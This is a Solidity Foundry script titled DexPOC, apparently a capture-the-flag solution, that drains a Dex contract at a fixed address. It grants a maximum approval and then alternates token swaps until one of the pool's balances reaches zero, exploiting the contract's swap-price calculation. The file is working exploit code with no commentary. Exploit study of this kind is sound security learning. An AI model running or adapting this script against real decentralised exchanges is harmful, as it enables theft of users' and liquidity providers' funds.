// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "./Dex.sol";

contract DexPOC is Script {
    function run() external {
        vm.startBroadcast();

        Dex dex = Dex(0x0495907C3024705dfA308554093B41f6ff0164be);
        address user = vm.envAddress("ETH_ACC");
        address t1 = dex.token1();
        address t2 = dex.token2();
        
        dex.approve(address(dex), 2**256-1);

        for (uint256 i = 0; i < 10; i++) {
            dex.swap(t1, t2, 1);
        }
        
        address from = t2;
        address to = t1;

        while (dex.balanceOf(t1, address(dex)) != 0 && dex.balanceOf(t2, address(dex)) != 0) {
          uint256 dexBalance = dex.balanceOf(from, address(dex));
          uint256 userBalance = dex.balanceOf(from, user);
          uint256 amount = userBalance > dexBalance ? dexBalance : userBalance;

          dex.swap(from, to, amount);
          
          from = from == t1 ? t2 : t1;
          to = to == t1 ? t2 : t1;
        }
        
        console.log("dex t1: ", dex.balanceOf(t1, address(dex)));
        console.log("dex t2: ", dex.balanceOf(t2, address(dex)));

        vm.stopBroadcast();
    }
}
